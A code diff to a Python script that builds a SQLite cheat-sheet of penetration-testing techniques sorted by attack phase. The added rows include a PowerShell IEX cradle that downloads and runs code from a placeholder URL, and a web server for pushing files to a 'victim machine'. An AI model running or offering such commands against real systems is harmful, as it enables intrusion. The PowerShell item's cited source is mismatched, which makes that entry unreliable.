@@ -29,14 +29,23 @@ cur.execute("INSERT INTO phases (phase) VALUES (?)", ('maintain access',))
 cur.execute("INSERT INTO phases (phase) VALUES (?)", ('covering',))
 cur.execute("INSERT INTO phases (phase) VALUES (?)", ('general',))
 
-## Select the tables
-cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
-#cur.execute("SELECT * FROM atack_oses")
-#cur.execute("SELECT * FROM phases")
+## Insert items
+cur.execute("INSERT INTO items (name, type_id, description, usage, source, cve, phase_id) VALUES (?,?,?,?,?,?,?)", 
+('host webserver', 1, 'host a webserver to download files on a victim machine', 'python -m SimpleHTTPServer <PORT> or php -S <IP>:<PORT>', 'https://unix.stackexchange.com/questions/32182/simple-command-line-http-server' ,'NA', 4))
 
-res = cur.execute("SELECT name FROM sqlite_master WHERE type='table';")
-for name in res.fetchall():
-    print(name[0])
+cur.execute("INSERT INTO items (name, type_id, description, usage, source, cve, phase_id) VALUES (?,?,?,?,?,?,?)", 
+('powershell download', 1, 'download file using powershell command', 'powershell IEX(New-Object Net.WebClient).downloadString(http://<URL>/<FILE>) or powershell IEX(New-Object Net.WebClient).downloadFile(http://<URL>/<FILE>, <FILE>)', 'https://unix.stackexchange.com/questions/32182/simple-command-line-http-server' ,'NA', 4))
+
+cur.execute("INSERT INTO items (name, type_id, description, usage, source, cve, phase_id) VALUES (?,?,?,?,?,?,?)", 
+('GTFO-bins', 2, 'check for misconfiguration in Unix binaries', 'search on website', 'https://gtfobins.github.io/', 'NA', 4))
+
+## Insert many-to-many
+cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 1))
+cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 2))
+cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 3))
+cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 4))
+cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (2, 2))
+cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (3, 1))
 
 connection.commit()
 connection.close()
